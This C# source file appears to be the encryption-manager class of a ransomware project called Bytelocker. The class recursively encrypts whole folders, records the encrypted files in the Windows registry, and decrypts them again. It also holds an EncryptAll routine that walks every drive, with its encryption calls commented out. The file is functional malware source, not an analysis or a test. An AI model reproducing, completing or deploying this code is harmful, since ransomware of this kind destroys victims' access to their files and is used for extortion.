using System;
using System.Collections.Generic;
using System.IO;
using Bytelocker.Settings;
using Bytelocker.UI;

namespace Bytelocker.CryptoManager
{
    internal class CryptoManagerMainHandler
    {
        private readonly RegistryManager rm;

        public CryptoManagerMainHandler()
        {
            rm = new RegistryManager();
            rm.CreateMainKey();
        }

        public void DecryptAll()
        {
            var fm = new FileManager();
            var files = rm.ReadAllValues(RegistryManager.FILES_KEY_NAME);

            if (!(files[0] == "null"))
                foreach (var file_path in files)
                {
                    MainWindow.current_decrypt_file = file_path;

                    fm.ChooseFile(file_path);
                    fm.SetupFileEncrypter();

                    for (;;)
                        if (fm.DecryptFile())
                        {
                            fm.DeleteFile();
                            fm.RenameTmpFileToOrig();
                            break;
                        }
                        else
                        {
                            if (!ErrorDecryptMessageBox.showMessageBoxDecryptError(file_path))
                            {
                                fm.removeRegistryItem();
                                break;
                            }
                        }
                }
        }


        public void EncryptAll()
        {
            var dfm = new DirManager();

            foreach (var drive in DriveInfo.GetDrives())
            {
                var dirs = DirManager.GetFoldersRecursive(drive.ToString());
                foreach (var subDir in dirs)
                {
                    //dfm.ChooseDir(subDir);
                    //dfm.EncryptDir();
                }
            }
        }


        public void EncryptFolder(string folder_path)
        {
            var dfm = new DirManager();
            var dirs = DirManager.GetFoldersRecursive(folder_path);
            foreach (var subDir in dirs)
            {
                dfm.ChooseDir(subDir);
                dfm.EncryptDir();
            }
        }

        public List<string> FilesEncryptedList()
        {
            try
            {
                return new List<string>(rm.ReadAllValues(RegistryManager.FILES_KEY_NAME));
            }
            catch (Exception)
            {
                // if the key does not exist return empty list
                return new List<string>();
            }
        }
    }
}